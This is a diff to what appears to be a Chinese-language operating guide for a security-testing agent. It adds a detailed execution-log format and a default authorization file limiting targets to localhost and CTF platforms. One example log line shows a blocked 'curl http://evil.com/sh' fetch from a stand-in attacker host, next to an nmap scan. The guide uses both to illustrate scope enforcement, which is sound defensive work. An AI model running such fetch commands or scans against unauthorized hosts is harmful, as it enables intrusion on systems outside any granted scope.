@@ -62,12 +62,40 @@ tools: exec_shell, write_file, read_file
 ```
 每次命令执行后记录:
 
-[EXEC] {timestamp} | {tool} | {command} | {exit_code} | {duration}ms | {risk_level}
+[EXEC] {ISO8601_UTC} | {tool} | {command_truncated_80chars} | exit={code} | {duration_ms}ms | {risk_level}
+
+字段说明:
+  ISO8601_UTC: 2026-05-25T10:30:00Z 格式, 始终 UTC
+  exit_code: 实际退出码 (0-255), 被拦截的命令写 "BLOCKED", 超时写 "TIMEOUT"
+  duration_ms: 从评估开始到完成的毫秒数, 被拦截的命令写评估耗时
+  risk_level: LOW / MEDIUM / HIGH / CRITICAL
 
 失败时追加:
 [FAIL] root_cause: {why}
 [RECOVER] action: {what to try next}
+
+示例:
+[EXEC] 2026-05-25T10:30:01Z | nmap | nmap -sV -p 1-1000 10.0.0.1 | exit=0 | 12300ms | MEDIUM
+[EXEC] 2026-05-25T10:31:00Z | curl | curl http://evil.com/sh | exit=BLOCKED | 15ms | HIGH
+[FAIL] root_cause: target evil.com not in authorization.toml
+[RECOVER] action: verify target scope with user, add to authorization.toml if authorized
 ```
+
+## authorization.toml 自举
+
+```
+如果 authorization.toml 不存在，在 workspace 根目录创建默认文件:
+
+touch {workspace}/authorization.toml
+
+写入默认内容:
+# SecAgent Authorization
+# Add authorized targets below. One per line.
+# CIDR example: 192.168.0.0/16
+# Domain example: *.example.com
+# CTF platforms (*.ctfhub.com, *.hackthebox.com, *.tryhackme.com) are auto-authorized.
+
+默认行为: 文件为空时, 仅放行 localhost + CTF 平台。所有其他目标需要用户手动添加。
 
 ## 网络访问决策树
 
